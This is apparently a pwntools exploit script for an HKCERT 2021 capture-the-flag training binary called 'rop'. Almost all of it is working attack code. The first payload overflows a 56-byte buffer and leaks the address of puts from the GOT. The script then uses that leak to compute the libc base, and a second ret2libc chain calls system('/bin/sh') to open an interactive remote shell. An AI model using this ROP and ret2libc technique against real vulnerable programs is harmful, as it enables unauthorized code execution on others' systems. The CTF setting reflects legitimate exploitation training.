#!/usr/bin/env python3

from pwn import *
from pwnlib.gdb import *

#context(arch='amd64',os='linux',log_level='debug')

elf = ELF('./rop')
p = elf.process()
libc = ELF('./libc-2.31.so')
p = remote('chal.training.hkcert21.pwnable.hk', 6006)
#gdb.attach(p) #debug rop chain, after runnning binary, immediately attach libc

offset = 56
junk = b'A'*offset

puts_at_plt = p64(0x004004a0) #
puts_at_got = p64(0x00601018) #
pop_rdi = p64(0x00400673) #
main_addr = p64(0x004005b7) #

payload = [
	junk,
	pop_rdi,
	puts_at_got,
	puts_at_plt,
	main_addr,
]

payload = b''.join(payload)

p.sendline(payload)
p.recvline()
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b'\x00'))

log.info(f'{hex(leak)=}')
puts_offset = 0x000875a0
system_offset = 0x00055410
base_addr_libc = leak - puts_offset
system_address = base_addr_libc + libc.symbols['system']

bin_sh_offset = 0x002b75aa #why is the address that i get in ghidra wrong????
base_addr_bin_sh = base_addr_libc + next(libc.search(b'/bin/sh\x00'))
test = base_addr_libc + bin_sh_offset
log.info(hex(next(libc.search(b'/bin/sh\x00'))))
log.info(f'{hex(base_addr_libc)=}')
ret_insruction = 0x0040048e

second_payload = [
	junk,
	pop_rdi,
	p64(base_addr_bin_sh),
	p64(ret_insruction),
	p64(system_address),
]

second_payload = b''.join(second_payload)
p.sendline(second_payload)

p.interactive()